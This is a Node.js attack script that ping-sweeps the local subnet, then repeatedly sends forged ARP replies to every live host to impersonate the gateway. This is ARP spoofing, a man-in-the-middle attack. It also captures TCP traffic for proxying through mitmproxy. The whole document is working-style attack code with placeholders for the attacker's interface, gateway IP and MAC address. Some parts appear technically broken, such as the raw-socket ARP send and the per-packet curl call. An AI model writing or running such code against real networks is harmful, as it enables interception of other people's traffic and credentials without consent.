const raw = require('raw-socket');
const pcap = require('pcap');
const ping = require('node-net-ping');
const os = require('os');
const { exec } = require('child_process');

// Function to get the network interface IP address
function getLocalIP(interfaceName) {
    const interfaces = os.networkInterfaces();
    if (interfaces[interfaceName]) {
        for (let details of interfaces[interfaceName]) {
            if (details.family === 'IPv4') {
                return details.address;
            }
        }
    }
    return null;
}

// Function to perform network scan
function scanNetwork(network, interfaceName) {
    return new Promise((resolve, reject) => {
        const session = ping.createSession();
        const hosts = [];
        const promises = [];
        for (let i = 1; i < 255; i++) {
            const target = `${network}.${i}`;
            promises.push(
                new Promise((res) => {
                    session.pingHost(target, (error, target) => {
                        if (!error) {
                            hosts.push(target);
                        }
                        res();
                    });
                })
            );
        }
        Promise.all(promises).then(() => resolve(hosts));
    });
}

// Function to create ARP packet
function createArpPacket(targetIp, targetMac, spoofIp, spoofMac) {
    const buffer = Buffer.alloc(42);
    // Ethernet header
    targetMac.split(':').forEach((hex, index) => {
        buffer.writeUInt8(parseInt(hex, 16), index);
    });
    spoofMac.split(':').forEach((hex, index) => {
        buffer.writeUInt8(parseInt(hex, 16), index + 6);
    });
    buffer.writeUInt16BE(0x0806, 12); // ARP protocol

    // ARP header
    buffer.writeUInt16BE(0x0001, 14); // Hardware type (Ethernet)
    buffer.writeUInt16BE(0x0800, 16); // Protocol type (IPv4)
    buffer.writeUInt8(6, 18);         // Hardware size
    buffer.writeUInt8(4, 19);         // Protocol size
    buffer.writeUInt16BE(0x0002, 20); // Opcode (ARP reply)

    // Sender MAC and IP
    spoofMac.split(':').forEach((hex, index) => {
        buffer.writeUInt8(parseInt(hex, 16), index + 22);
    });
    spoofIp.split('.').forEach((octet, index) => {
        buffer.writeUInt8(parseInt(octet), index + 28);
    });

    // Target MAC and IP
    targetMac.split(':').forEach((hex, index) => {
        buffer.writeUInt8(parseInt(hex, 16), index + 32);
    });
    targetIp.split('.').forEach((octet, index) => {
        buffer.writeUInt8(parseInt(octet), index + 38);
    });

    return buffer;
}

// Function to send ARP packet
function sendArpPacket(interface, targetIp, targetMac, spoofIp, spoofMac) {
    const socket = raw.createSocket({ protocol: raw.Protocol.ARP });
    const packet = createArpPacket(targetIp, targetMac, spoofIp, spoofMac);

    socket.send(packet, 0, packet.length, targetIp, (error, bytes) => {
        if (error) {
            console.error('Error sending ARP packet:', error);
        } else {
            console.log(`Sent ${bytes} bytes to ${targetIp}`);
        }
        socket.close();
    });
}

// Function to capture and redirect packets to mitmproxy
function capturePackets(interfaceName) {
    const pcapSession = pcap.createSession(interfaceName, "ip proto \\tcp");
    console.log('Packet capture started on interface:', interfaceName);

    pcapSession.on('packet', (rawPacket) => {
        const packet = pcap.decode.packet(rawPacket);
        // Redirect packet to mitmproxy
        exec(`curl -k --proxy http://localhost:8080 ${packet.link.ip.dst}`);
    });
}

// Get the local IP and network interface
const interfaceName = 'YOUR_INTERFACE_NAME'; // Replace with your network interface name
const localIP = getLocalIP(interfaceName);
if (!localIP) {
    console.error('Unable to determine local IP address.');
    process.exit(1);
}

// Derive the network from the local IP
const network = localIP.split('.').slice(0, 3).join('.');

// Scan the network for active hosts
scanNetwork(network, interfaceName)
    .then(hosts => {
        console.log('Active hosts:', hosts);

        // Perform ARP spoofing on each identified host
        const spoofIp = 'YOUR_GATEWAY_IP'; // IP address to spoof (usually the gateway)
        const spoofMac = 'YOUR_MAC_ADDRESS'; // Your MAC address
        const targetMac = 'ff:ff:ff:ff:ff:ff'; // Broadcast MAC address, replace with actual MAC if known

        hosts.forEach(targetIp => {
            setInterval(() => {
                sendArpPacket(interfaceName, targetIp, targetMac, spoofIp, spoofMac);
            }, 2000); // Send ARP packet every 2 seconds
        });

        // Start capturing packets
        capturePackets(interfaceName);
    })
    .catch(err => {
        console.error('Error scanning network:', err);
    });
